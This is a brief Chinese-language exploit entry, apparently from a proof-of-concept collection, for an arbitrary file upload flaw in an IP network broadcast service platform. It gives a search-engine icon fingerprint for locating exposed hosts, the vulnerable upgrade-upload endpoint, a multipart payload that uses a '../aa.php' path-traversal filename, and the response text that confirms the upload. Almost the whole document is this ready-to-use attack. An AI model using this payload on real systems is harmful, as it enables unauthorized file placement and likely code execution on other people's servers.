# IP网络广播服务平台任意文件上传漏洞

IP网络广播服务平台 ｜ 文件上传 ｜ —
- **指纹**：`web.icon=="9091011a03bffd9898d79fc589a2c65d"`
- **请求**：`POST /api/v2/remote-upgrade/upload HTTP/1.1`

**Payload**
```
------234561
Content-Disposition: form-data; name="file"; filename="../aa.php"
Content-Type: application/octet-stream
234561
------234561--
```
- **响应特征**：200 “version”
返回上传路径